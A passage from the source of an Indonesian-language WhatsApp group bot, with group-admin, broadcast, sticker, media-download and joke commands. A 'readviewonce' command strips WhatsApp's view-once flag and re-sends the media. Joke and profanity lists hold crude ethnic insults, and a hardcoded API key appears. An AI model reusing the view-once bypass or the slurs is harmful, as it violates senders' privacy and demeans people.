await hupao.groupAcceptInvite(result).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'editsubjek': {
if (groupMute) return 'error'
if (!m.isGroup) return reply('Fitur Khusus Group')
if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
if (!isAdmins) return reply('Fitur untuk admin')
if (!text) throw 'Text nya ?'
await loading()
await hupao.groupUpdateSubject(from, text).then((res)).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'editdesk':{
if (groupMute) return 'error'
if (!m.isGroup) return reply('Fitur Khusus Group')
if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
if (!isAdmins) return reply('Fitur untuk admin')
if (!text) throw 'Text Nya ?'
await loading()
await hupao.groupUpdateDescription(from, text).then((res)).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'tagall': {
    if (groupMute) return 'error'
if (!isAdmins) return reply(mess.admin)
if (!m.isGroup) return
await loading()
let teks = `══✪〘 *👥 Tag All* 〙✪══
 ➲ *Pesan : ${q ? q : 'kosong'}*\n\n`
for (let mem of participants) {
teks += `❏ @${mem.id.split('@')[0]}\n`
}
hupao.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: fkontak})
}
break
//=================================================//
case'demoteall':
if (groupMute) return 'error'
if (!m.isGroup) return 
reply('Fitur Khusus Group')
if (!isBotAdmins) return 
reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Fitur untuk admin')
await loading()
var groupe = await hupao.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
hupao.groupParticipantsUpdate(from, mems, 'demote')
break
//=================================================//
case'promoteall':
if (groupMute) return 'error'
if (!m.isGroup) return reply('Fitur Khusus Group')
if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
if (!isAdmins) return reply('Fitur untuk admin')
await loading()
var groupe = await hupao.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
hupao.groupParticipantsUpdate(from, mems, 'promote')
break
//=================================================//
case 'sticker': case 's': case 'stickergif': case 'sgif': {
    if (groupMute) return 'error'
 if (!quoted) throw `Balas Video/Image Dengan Caption ${prefix + command}`
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await hupao.sendImageAsSticker(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await hupao.sendVideoAsSticker(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
}
}
break
//=================================================//
case 'inspect': {
    if (groupMute) return 'error'
if (isBan) return reply('*Lu Di Ban Owner*')
if (!args[0]) return reply("Linknya?")
let linkRegex = args.join(" ")
let coded = linkRegex.split("https://chat.whatsapp.com/")[1]
if (!coded) return m.reply("Link Invalid")
hupao.query({
tag: "iq",
attrs: {
type: "get",
xmlns: "w:g2",
to: "@g.us"
},
content: [{ tag: "invite", attrs: { code: coded } }]
}).then(async(res) => { 
tekse = `「 Group Link Yang Di Inspect 」
▸ Nama Group : ${res.content[0].attrs.subject ? res.content[0].attrs.subject : "undefined"}

▸ Deskripsi Di Ubah : ${res.content[0].attrs.s_t ? moment(res.content[0].attrs.s_t *1000).tz("Asia/Jakarta").format("DD-MM-YYYY, HH:mm:ss") : "undefined"}
▸ Pembuat Group : ${res.content[0].attrs.creator ? "@" + res.content[0].attrs.creator.split("@")[0] : "undefined"}
▸ Group Di Buat : ${res.content[0].attrs.creation ? moment(res.content[0].attrs.creation * 1000).tz("Asia/Jakarta").format("DD-MM-YYYY, HH:mm:ss") : "undefined"}
▸ Total Member : ${res.content[0].attrs.size ? res.content[0].attrs.size : "undefined"} Member

▸ ID Group  : ${res.content[0].attrs.id ? res.content[0].attrs.id : "undefined"}

©By ${botname}`
try {
pp = await hupao.profilePictureUrl(res.content[0].attrs.id + "@g.us", "image")
} catch {
pp = "https://tse2.mm.bing.net/th?id=OIP.n1C1oxOvYLLyDIavrBFoNQHaHa&pid=Api&P=0&w=153&h=153"
}
hupao.sendFile(from, pp, "", m, { caption: tekse, mentions: await hupao.parseMention(tekse) })

})
}
break
//=================================================
case "welcome":
{
    if (groupMute) return 'error'
if (!isOwner) return reply(mess.owner)
if (!m.isGroup) return reply('Fitur Khusus Group')
await loading()
if (args.length < 1) return reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (welcm) return reply('Sudah Aktif')
wlcm.push(from)
var groupe = await hupao.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
hupao.sendMessage(from, {text: `Fitur Welcome Di Aktifkan Di Group Ini`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!welcm) return reply('Sudah Non Aktif')
let off = wlcm.indexOf(from)
wlcm.splice(off, 1)
reply('Sukses Mematikan Welcome  di group ini')
}
}
break
//=================================================
case 'bcgc': case 'bcgroup': {
    if (groupMute) return 'error'
if (!owner) return reply('Khusus Owner')
await loading()
if (!text) throw `Text mana?\n\nExample : ${prefix + command} boedzhanks`
let getGroups = await hupao.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
for (let i of anu) {
await sleep(1500)
hupao.sendMessage(i, {text: `${text}`}, {quoted:fkontak})
    }
reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
}
break

case 'readvo': case 'readviewonce':
    if (groupMute) return 'error'
if (m.quoted.mtype == 'viewOnceMessageV2') {
    if (m.isBaileys && m.fromMe) return
    let val = { ...m }
    let msg = m.quoted.message
    delete msg[Object.keys(msg)[0]].viewOnce
    val.message = msg
    await hupao.sendMessage(m.chat, { forward: val }, { quoted: m })
}
break

case 'antiviewonce': {
if (groupMute) return 'error'
    if (!m.isGroup) return reply('Fitur Khusus Group')
    if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
    if (!isAdmins) return reply('Fitur untuk admin')
    await loading()
    if (args.length < 1) return reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
    if (args[0] === "on") {
    if (isAntiViewOnce) return m.reply('Sudah Aktif')
    antiviewonce.push(from)
    m.reply('🚩 Succes menyalakan antiviewonce di group ini ')
    } else if (args[0] === "off") {
    if (!isAntiViewOnce) return m.reply('Sudah Mati')
    let off = antiviewonce.indexOf(from)
    antiviewonce.splice(off, 1)
    m.reply('🚩 Succes mematikan antiviewonce di group ini ')
    } else {
    m.reply('on untuk mengaktifkan, off untuk menonaktifkan')
    }
    }
    break
//=================================================//
case 'antilink': {
    if (groupMute) return 'error'
if (!m.isGroup) return reply('Fitur Khusus Group')
if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
if (!isAdmins) return reply('Fitur untuk admin')
await loading()
if (args.length < 1) return reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (AntiLink) return m.reply('Sudah Aktif')
ntilink.push(from)
m.reply('🚩 Succes menyalakan antilink di group ini ')
} else if (args[0] === "off") {
if (!AntiLink) return m.reply('Sudah Mati')
let off = ntilink.indexOf(from)
ntilink.splice(off, 1)
m.reply('🚩 Succes mematikan antilink di group ini ')
} else {
m.reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break

case 'mute': {
    if (!m.isGroup) return reply('Fitur Khusus Group')
    if (!isAdmins) return reply('Fitur untuk admin')
    if (groupMute) return m.reply('Hutao sudah dimute di group ini')
    gcmute.push(from)
    fs.writeFileSync('./lib/mute.json', JSON.stringify(gcmute, null, 2))
    await hupao.sendMessage(from, {text: 'Hutao dimute di group ini'}, {quoted: fkontak})
    }
    break

    case 'unmute': {
        if (!m.isGroup) return reply('Fitur Khusus Group')
        if (!isAdmins) return reply('Fitur untuk admin')
        if (!groupMute) return m.reply('Hutao belum dimute, ingin mute hutao? ketik mute')
        let off = gcmute.indexOf(from)
        gcmute.splice(off, 1)
        fs.writeFileSync('./database/user.json', JSON.stringify(gcmute, null, 2))
        await hupao.sendMessage(from, {text: 'Hutao kembali'}, {quoted: fkontak})
        }
        break
//=================================================
//=================================================
case "antitoxic":
{
if (groupMute) return 'error'
if (!m.isGroup) return reply('Fitur Khusus Group')
if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
if (!isAdmins) return reply('Fitur untuk admin')
await loading()
if (args.length < 1) return m.reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (welcmm) return m.reply('Sudah Aktif')
wlcmm.push(from)
var groupe = await hupao.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
hupao.sendMessage(from, {text: `Fitur Anti Toxic Di Aktifkan Di Group Ini`, contextInfo: { mentionedJid : mems }}, {quoted:fkontak})
} else if (args[0] === "off") {
if (!welcmm) return m.reply('Sudah Non Aktif')
let off = wlcmm.indexOf(from)
wlcmm.splice(off, 1)
reply('Sukses Mematikan Anti Toxic  di group ini')
}
}
break
//=================================================
case 'larangan': case 'peraturan': {
    if (groupMute) return 'error'
await loading()
 if (!m.isGroup) return reply('Fitur Khusus Group')
hupao.sendMessage(from, { text : `Haii 👋 Aku ${botname}
Aku Sebagai Admin Akan Melarang Kalian Untuk Toxic Ataupun Berkata Kasar Di group Ini !!!

Larangan !!!
fuck
ajg
anjing
ngentod
bangsat
bgst
babi
kontol
memek
penis
pukimak
tolol
gblg
gblok` , mentions: participants.map(a => a.id)}, {quoted:fkontak})
}
break
//=================================================//
case 'fuck': case 'ajg': case 'ngentod': case 'bangsat': case'anjing': case'babi': case'kontol': case'memek': case'penis': case 'ngewe': case 'yatim': case 'piatu': case 'pentil': case 'pepek': case 'tempi': case 'tempe': case 'bajingan': case 'ndasmu':{
if (groupMute) return 'error'
    if (!welcmm) return
if (!isBotAdmins) return reply(`${mess.botAdmin}, _Untuk menendang orang yang mengirim link group_`)
if (!m.isGroup) return m.reply('Jangan Toxic Coy Kalau Di group Dah Ku Kick Anjay')
if (isAdmins) return hupao.sendMessage(m.chat, {text: `\`\`\`「 Kata Kasar Terdeteksi 」\`\`\`\n\nAdmin sudah Toxic, admin bebas Toxic apapun`})
if (isOwner) return hupao.sendMessage(m.chat, {text: `\`\`\`「 Kata Kasar Terdeteksi 」\`\`\`\n\Owner telah Toxic, owner bebas Toxic apa pun`})
await hupao.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
hupao.sendMessage(from, {text:`\`\`\`「 Kata Kata Toxic Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} Jangan toxic di group ini`, contextInfo:{mentionedJid:[sender]}}, {quoted:fkontak})
}
break
//Download Menu
        case 'play':  case 'song': {
            if (groupMute) return 'error'
            if (!isPrem) return errorReply(mess.prem)
        if (!text) return reply('*Masukan Judul / Link Dari YouTube!*')
        await loading()
        const playmp3 = require('./lib/ytdl.js')
                let search = await youtube(text)
                let convert = search.videos[0]
        const pl= await playmp3.mp3(convert.url)
        await hupao.sendMessage(m.chat,{
            audio: fs.readFileSync(pl.path),
            fileName: convert.title + '.mp3',
            mimetype: 'audio/mp4', ptt: true,
            contextInfo:{
                externalAdReply:{
                    title:convert.title,
                    body: `Boedzhanks`,
                    thumbnail: await fetchBuffer(pl.meta.image),
                    mediaType:2,
                    mediaUrl:convert.url,
                }
        
            },
        },{quoted:m})
        await fs.unlinkSync(pl.path)
        }
        break

        case 'ytmp3': case 'ytaudio':
            if (groupMute) return 'error'
            if (!isPrem) return errorReply(mess.prem)
            let audp3 = require('./lib/ytdl.js')
            if (args.length < 1 || !isUrl(text) || !audp3.isYTUrl(text)) return reply(`Where's the yt link?\nExample: ${prefix + command} https://youtube.com/shorts/YQf-vMjDuKY?feature=share`)
            await loading()
            let audio = await audp3.mp3(text)
            await hupao.sendMessage(m.chat,{
                audio: fs.readFileSync(audio.path),
                mimetype: 'audio/mp4', ptt: true,
                contextInfo:{
                    externalAdReply:{
                        title:audio.meta.title,
                        body: `By Boedzhanks`,
                        thumbnail: await fetchBuffer(audio.meta.image),
                        mediaType:2,
                        mediaUrl:text,
                    }
            
                },
            },{quoted:m})
            await fs.unlinkSync(audio.path)
            break

            case 'ytmp4': case 'ytvideo': {
                if (groupMute) return 'error'
                if (!isPrem) return errorReply(mess.prem)
                const vidoh = require('./lib/ytdl.js')
                if (args.length < 1 || !isUrl(text) || !vidoh.isYTUrl(text)) reply(`Where is the link??\n\nExample : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`)
                await loading()
                const vid=await vidoh.mp4(text)
                const ytc=`
「 Youtube Download 」

*▢ Title:* ${vid.title}
*▢ Date:* ${vid.date}
*▢ Duration:* ${vid.duration}
*▢ Quality:* ${vid.quality}`
                await hupao.sendMessage(m.chat,{
                    video: {url:vid.videoUrl},
                    caption: ytc
                },{quoted:m})
                }
                break

                case 'tiktok': case 'tiktokdl': case 'ttdl': case 'tt':{
                    if (groupMute) return 'error'
                    if (!isPrem) return errorReply(mess.prem)
                        if (!q) return reply( `Example : ${prefix + command} link`)
                        if (!q.includes('tiktok', 'vt')) return reply(`Link Invalid!!`)
                        await loading()
                        try {
                        ttlinkwm = await tiktok.tiktok(q)
                            desc = `「 Tiktok Download 」\n\n❏ Author: ${ttlinkwm.author}\n\n❏ Description: ${ttlinkwm.desc}`
                            await hupao.sendMessage(m.chat, { caption: desc, video: { url: ttlinkwm.nowm }}, {quoted:m})
                        } catch (error) {
                            reply('error')
                        }
                        }
                    break
                    case 'tiktoknowm': case 'ttnowm': {
                         if (groupMute) return 'error'
                        if (!isPrem) return errorReply(mess.prem)
                        if (!q) return reply( `Example : ${prefix + command} link`)
                        if (!q.includes('tiktok', 'vt')) return reply(`Link Invalid!!`)
                        await loading()
                        try {
                        ttlinknowm = await tiktok.tiktok(q)
                            desc = `「 Tiktok Download 」\n\n❏ Author: ${ttlinknowm.author}\n\n❏ Description: ${ttlinknowm.desc}`
                            await hupao.sendMessage(m.chat, { caption: desc, video: { url: ttlinknowm.watermark }}, {quoted:m})
                        } catch (error) {
                            reply('error')
                        }
                        }
                        break
                    case 'tiktokaudio':{
                         if (groupMute) return 'error'
                        if (!isPrem) return errorReply(mess.prem)
                    if (!q) return reply( `Example : ${prefix + command} link`)
                    if (!q.includes('tiktok', 'vt')) return reply(`Link Invalid!!`)
                        await loading()
                    try {
                    tiktokaudio = require('./lib/tiktok2.js')
                    tiktoklinkaudio = await tiktokaudio.tiktok(q)
                    const tikmp3 = {url:data.audio}
                    await hupao.sendMessage(m.chat, { audio: tikmp3, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
                    } catch (error) {
                        reply('error')
                    }
                }
                    break

                    case 'twitdl' : case 'twit' : case 'twitvideo': case 'twitter': { 
                         if (groupMute) return 'error'
                        if (!isPrem) return errorReply(mess.prem)
                            if (!q) return reply( `Example : ${prefix + command} link`)
                                if (!q.includes('twitter.com', 'x.com')) return reply(`Link Invalid!!`)
                        await loading()
                    let twitlink = q.replace(/x/, 'twitter')
                    try {
                    data = await twitterdown(twitlink)
                    p = data.data
                    await hupao.sendMessage(from, { video: { url: p.HD }, caption: '「 Twitter Download 」' })
                    } catch (error) {
                        reply('error')
                    }
                }
                    break
                    
                    case 'igdl' : case 'instagram': { 
                         if (groupMute) return 'error'
                        if (!isPrem) return errorReply(mess.prem)
                            if (!q) return reply( `Example : ${prefix + command} link`)
                                if (!q.includes('instagram.com')) return reply(`Link Invalid!!`)
                        await loading()
                    try {
                    data = await ndown(q)
                    p = data.data[0]
                    await hupao.sendMessage(from, { video: { url: p.url }, caption: '「 Instagram Download 」' })
                    } catch (error) {
                        reply('error')
                    }
                }
                    break

                    case 'reddit':
                    case 'redditdl':
                        {
                             if (groupMute) return 'error'
                    if (!isPrem) return errorReply(mess.prem)
                    if(!q) return errorReply(`Mana Linknya`)
                    await loading()
                    const { reddit } = require('./scrape/reddit.js')
                    try {
                        data = await reddit(q)
                            console.log(data)
                            const tex = `「 Reddit Download 」`
                            await hupao.sendMessage(from, {video: {url: data.video}, caption: tex}, {quoted: m})
                    } catch (error) {
                        reply('error')
                    }
                        }
                        break 

                    case 'fbdl' : case 'fb' : case 'fbvideo': case 'facebook': { 
                         if (groupMute) return 'error'
                        if (!isPrem) return errorReply(mess.prem)
                            if (!q) return reply( `Example : ${prefix + command} link`)
                                if (!q.includes('facebook.com', 'fb.watch')) return reply(`Link Invalid!!`)
                        await loading()
                        try{
                        fblink = await fb.fbdown(q)
                        linkFb = fblink.links.hd || fblink.links.sd
                        const tex = `「 Facebook Download 」\n\nTitle: ${fblink.title}\nDuration: ${fblink.duration}`;
                        await hupao.sendMessage(from, { video: { url: linkFb }, caption: tex },{quoted:m})
                        } catch (error) {
                            reply('error')
                        }
                    }
                    break

case 'git': case 'gitclone':
     if (groupMute) return 'error'
    if (!isPrem) return errorReply(mess.prem)
if (!args[0]) return reply(`Where is the link?\nExample :\n${prefix}${command} https://github.com/boedzhanks/ShinoaTelebot`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return reply(`Link invalid!!`)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    hupao.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => reply('error om :<'))
break

case 'yts': case 'ytsearch':{
     if (groupMute) return 'error'
    if (!isPrem) return errorReply(mess.prem)
    if (isBan) return reply('Lu di ban kocak awokwok') 
    if (!text) reply(`Gunakan dengan cara ${prefix+command} *text*\n\n_Contoh_\n\n${prefix+command} Boedzhanks Store`)
    let reso = await yts(`${text}`)
    let aramat = reso.all
    var tbuff = await getBuffer(aramat[0].image)
    let teks = aramat.map(v => {
    switch (v.type) {
            case 'video': return `
    📛 Title : *${v.title}* 
    ⏰ Durasi: ${v.timestamp}
    🚀 Diupload ${v.ago}
    😎 Views : ${v.views}
    🌀 Url : ${v.url}
    `.trim()
            case 'channel': return `
    📛 Channel : *${v.name}*
    🌀 Url : ${v.url}
    👻 Subscriber : ${v.subCountLabel} (${v.subCount})
    🎦 Total Video : ${v.videoCount}
    `.trim()
    }
    }).filter(v => v).join('\n----------------------------------------\n')
    
    hupao.sendMessage(m.chat, { image: tbuff, caption: teks }, { quoted: m })
    
     .catch((err) => {
    reply("Not found")
    })
    }
    break
//=================================================

case 'wm': {
     if (groupMute) return 'error'
if (isBan) return m.reply('*Kamu masuk dalam daftar ban*')

let teks = `${text}`
{
 if (!quoted) throw `Balas Video/Image Dengan Caption ${prefix + command}`
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await hupao.sendImageAsSticker(from, media, m, { packname: `${teks}`, author: `${botname}` })
await fs.unlinkSync(encmedia)
}
}
}
break
//=================================================//
case 'wmvideo':{
     if (groupMute) return 'error'
if (isBan) return m.reply('*Kamu masuk dalam daftar ban*')

let teks = `${text}`
{
 if ((quoted.msg || quoted).seconds > 11) return m.reply('Maksimal 10 detik!')
if (/video/.test(mime)) {
let media = await quoted.download()
let encmedia = await hupao.sendVideoAsSticker(from, media, m, { packname: `${teks}`, author: `${botname}` })
await fs.unlinkSync(encmedia)
} else {
throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
}
}
}
break
//=================================================//
        case'blackpink':case'rainbow2':case'water_pipe':case'halloween':case'sketch':case'sircuit':case'discovery':case'metallic2':case'fiction':case'demon':case'transformer':case'berry':case'thunder':case'magma':case'3dstone':case'neon':case'glitch':case'harry_potter':case'embossed':case'broken':case'papercut':case'gradient':case'glossy':case'watercolor':case'multicolor':case'neon_devil':case'underwater':case'bear':case'wonderfulg':case'christmas':case'neon_light':case'snow':case'cloudsky':case'luxury2':case'gradient2':case'summer':case'writing':case'engraved':case'summery':case'3dglue':case'metaldark':case'neonlight':case'oscar':case'minion':case'holographic':case'purple':case'glossyb':case'deluxe2':case'glossyc':case'fabric':case'neonc':case'newyear':case'newyear2':case'metals':case'xmas':case'blood':case'darkg':case'joker':case'wicker':case'natural':case'firework':case'skeleton':case'balloon':case'balloon2':case'balloon3':case'balloon4':case'balloon5':case'balloon6':case'balloon7':case'steel':case'gloss':case'denim':case'decorate':case'decorate2':case'peridot':case'rock':case'glass':case'glass2':case'glass3':case'glass4':case'glass5':case'glass6':case'glass7':case'glass8':case'captain_as2':case'robot':case'equalizer':case'toxic':case'sparkling':case'sparkling2':case'sparkling3':case'sparkling4':case'sparkling5':case'sparkling6':case'sparkling7':case'decorative':case'chocolate':case'strawberry':case'koifish':case'bread':case'matrix':case'blood2':case'neonligth2':case'thunder2':case'3dbox':case'neon2':case'roadw':case'bokeh':case'gneon':case'advanced':case'dropwater':case'wall':case'chrismast':case'honey':case'drug':case'marble':case'marble2':case'ice':case'juice':case'rusty':case'abstra':case'biscuit':case'wood':case'scifi':case'metalr':case'purpleg':case'shiny': case'jewelry':case'jewelry2':case'jewelry3':case'jewelry4':case'jewelry5':case'jewelry6':case'jewelry7':case'jewelry8':case'metalh':case'golden':case'glitter':case'glitter2':case'glitter3':case'glitter4':case'glitter5':case'glitter6':case'glitter7':case'metale':case'carbon':case'candy':case'metalb':case'gemb':case'3dchrome':case'metalb2':case'metalg':
{
     if (groupMute) return 'error'
if (isBan) return reply('Lu di ban kocak awokwok') 
if (!text) return reply(`Gunakan dengan cara .neon *text*`)
await loading()
hupao.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
let texpro = await getBuffer(`https://api.zeeoneofc.my.id/api/textpro/${command}?text=${q}&apikey=junaa`)
try{
await hupao.sendMessage(m.chat, {image: texpro, caption: "Done kak"}, {quoted: m})
hupao.sendMessage(m.chat, { react: { text: `✅`, key: m.key }})
} catch (err){
reply(`error`) 
}
}
break
//=================================================//
case 'pin': case 'pinterest': {
     if (groupMute) return 'error'
if (!isCreator) return reply('fitur dinonaktifkan')
if (isBan) return m.reply('*Kamu masuk dalam daftar ban*')
await loading()
let { pinterest } = require('./lib/scraper.js')
anu = await pinterest(text)
result = anu[Math.floor(Math.random() * anu.length)]
hupao.sendMessage(from, {image: { url: result }, caption: 'SUKSES'},{quoted:m})
}
break

case 'cekkhodam': case 'khodam': {
     if (groupMute) return 'error'
    const items = [
        "Nasi goreng", "Hamster kombat", "Seblak", "Singa putih", "Bihun",
        "Kabel data vivan", "Rx king", "Jokowi", "Si gemoy", "Si imut",
        "Ambatukam", "Ambatron", "super charging 65 wat", "Admin bokep", "Jakarta",
        "Jawa banget njir", "Emrror", "Kenapa gambar ini tidak mendapatkan banyak penggemar seperti Ronaldo dan Messi",
        "Skibidi toilet", "Gyatt", "Nasi campur", "Martabak khas surabaya", "Dejek",
        "Persija", "Makassar", "Indosiar", "18+", "PornHUB", "Cantik", "Surya kretek",
        "Israel", "Pertamina", "Jawa barat", "Anies baswedan", "Prabowo", "Gibran",
        "Macan merah", "Kanjut", "Raja iblis", "Ratu iblis", "Ripper", "Hai", "India",
        "Kecap bangau", "King slot", "Mewing", "Sigma", "Batak", "Sulawesi", "Google chrome",
        "Facebook", "Instagram", "Babi jember", "Nathan cu a on", "Ernando bakar sate",
        "4/64GB", "Nokia", "Keyboard samsung", "Gada", "Affilate tiktok", "Casan tesla",
        "Starlink", "Bokep 4K", "Android", "Fomo", "Airdrop", "Selamat kamu mendapatkan hadiah sebesar 1juta, dipotong pajak 1juta",
        "Raja cyrpto", "Singa putih", "Nasi kuning", "Rendang Babi", "Iwak", "Holan bakri",
        "Scam", "Munyuk", "Informasi palsu", "Jawir nih boss", "Banjarmasin slowmo",
        "No rispek", "Emyu", "Pergi kau suki", "Sunda kontol😂", "Professor yakub pencinta bule",
        "Nguawor", "Nganggur", "Kitab kripto😂", "Diskotik bogor", "Berteknologi tinggi",
        "Macan Putih", "Bebek Goreng", "Ayam Geprek", "Singa Putih", "Buku Gambar",
        "Buku Tulis", "Penggaris", "Papan Tulis", "Gunting Kuku", "Harimau", "Macan Tutul",
        "Anime", "Macan Ompong", "Es Teh", "TEH JUS", "Marimas Anggur", "Teh Gelas",
        "Jus Alpukat", "Puntung Rokok", "Ubur Ubur", "Remote TV", "Cacing Buncit",
        "Monyet Mullet", "Knalpot Mio", "Mie Ayam", "Bakso", "Bakso Cuanki", "Sumpit Gacoan",
        "Standar Motor", "Pala Mio", "Beat Karbu", "Jerapah", "Badak Hitam", "Lumba Lumba",
        "Laba Laba Sunda", "Ambatukam", "Ambatron", "Kelly FF", "Kopi ABC", "Kapal Lawut",
        "Tunggu Kiris", "Keris Tumpul", "Kak Gem", "Uni Bakwan", "Sprei Gratis", "Mejikom",
        "Kuali Goreng", "Kuah Soto", "Cilok Idaman", "Batagor", "Siomay", "Kue Pancong",
        "Kipas Angin", "Topi Upacara", "Sepatu Adidas", "RAJA IBLIS", "Banaspati",
        "Air Cucian Beras", "Remote AC", "Kosong", "Sosok Hitam", "Si Imut", "Chargeran",
        "Kabel Type C", "Nenek Gayung", "Vampire Ompong", "Bajing Loncat", "Ular Sawah",
        "Ubi Cilembu", "Pencil 2B", "Korek Api", "Ukelele", "Pecel Lele", "Ondel Ondel",
        "Kuda Poni", "Kuda Lumping", "Sound System", "Polisi Tidur", "Ban Dalem",
        "Sempak Bolong", "Kue Pancong", "Seblak", "Seblak Ceker", "Sarimi Ayam Bawang",
        "Balmond", "Mesin Bubut", "Sate Biawak", "Katak Bhizer", "Kolor Ijo", "Kucing",
        "Kecebong", "Ikan Mujaer", "Ayam Bakar", "Mie Gacoan", "Kipas Angin", "Panci Warteg",
        "Jangrik Krispi", "Sikat Gigi", "Mesin Cuci", "Vas Bunga", "Kuntilanak Mewing",
        "Pocong Ngesot", "Sabun Colek", "Pisau Dapur", "Mio Mirza", "Kaleng Sarden",
        "Kursi Goyang", "Masako Ayam", "Tutup Botol", "Undur Undur", "Buaya Buntung",
        "Celana Levis", "Kuda Terbang", "Cicak", "Es Cendol", "Ikan Hiu", "Marimas Jeruk",
        "Ikan Lohan", "Pohon Kelapa", "Sendal Swalow", "Tikus Got", "Singa Paddlepop",
        "Ayam Warna Warni", "Minyak Kayu Putih", "Pulpen", "Fresh Care", "Martabak Manis",
        "Martabak Asin", "Casing HP", "Mangkok Mie Ayam", "Tahu Bulat", "Garpu Siomay",
        "Lontong Sayur", "Es Kul Kul", "Ayam Rechesee", "Udang Saos Tiram", "Bakso Beranak",
        "Stang Motor", "Belut Sawah", "Ular Tangga", "Gajah Duduk", "Pisang Goreng",
        "Spion Motor", "Bubur Ayam", "Tabung Gas", "Bingkai Foto", "Laler", "Rengginang",
        "Keset Selamat Datang", "Kera Putih", "Sempol Ayam", "Bintang Laut", "Sayur Asem",
        "Tempe Bacem", "Jepit Jemuran", "Ikan Sapu Sapu", "Royco Sapi", "Tahu Gejrot",
        "Masako Sapi", "Royco Ayam", "Sayur Lodeh", "Jagung Bakar", "Telur Dadar",
        "Musang", "Kanebo", "Sabun Cuci Steam", "Kadal Gurun", "Domba Garut", "Sapi Qurban",
        "Barbie", "Kelereng", "Kuda Catur", "Kue Putu", "Ulat Bulu", "Pangsit",
        "Bakpau Isi Kacang", "Kecoa Dubia", "Naga Bearbrend", "Pesulap Merah", "Toji Kerupuk",
        "Pohon Bijak", "Tisu Toilet", "Daun Pisang", "Batu Bata", "Cumi Cumi", "Ale Ale",
        "Telur Puyuh", "Rujak Asem", "Ceker Babat", "Tuyul Wolfcut", "Handuk Hotel",
        "Sendal Jepit", "Rokok Fajar", "Ketupat", "Nasi Kuning", "Nasi Uduk", "Kerak Telor",
        "Nasi Liwet", "Ember Bocor", "jas Hujan", "Bengbeng", "Sapu Ijuk", "Es Tebu",
        "Makaroni Basah", "Es Campur", "Es Kelapa Muda", "Gayung", "Toilet Duduk",
        "Ular Piton", "Pohon Beringin", "Jamur Krispi", "Cireng Isi", "Fiesta Nugget",
        "Cimol Bandung", "Semut Rangrang", "Tongsis", "Kerambol", "Meja Billiard",
        "Kaos Kaki", "Supra Bapak", "Spion Motor", "Kelelawar", "Laba Laba", "Kecebong",
        "Semut", "Topeng Monyet", "Buaya Darat", "Ikan Cupang", "Kaki Seribu", "Burung Emprit",
        "Singa asli Surabaya", "Kulkas Polytron", "Ular kadut", "Pohon beringin", "Janda bolong",
        "Kominfo", "Tni Amerika"
      ]
      function getRandomItem(array) {
        const randomIndex = Math.floor(Math.random() * array.length);
        return array[randomIndex];
      }
      const result = getRandomItem(items);
      hupao.sendMessage(from, {text: `${pushname} khodam kamu adalah _${result}_`}, {quoted: fkontak})

}
break
//=================================================//
//=================================================
case 'smeme':
     if (groupMute) return 'error'
if (isBan) return m.reply('*Kamu masuk dalam daftar ban*')
 if (!text) throw `Balas Image Dengan Caption ${prefix + command}`
if (!quoted) throw `Balas Image Dengan Caption ${prefix + command}`
if (/image/.test(mime)) {
m.reply('*Sabar Cuy Loading*')
mee = await hupao.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(mee)
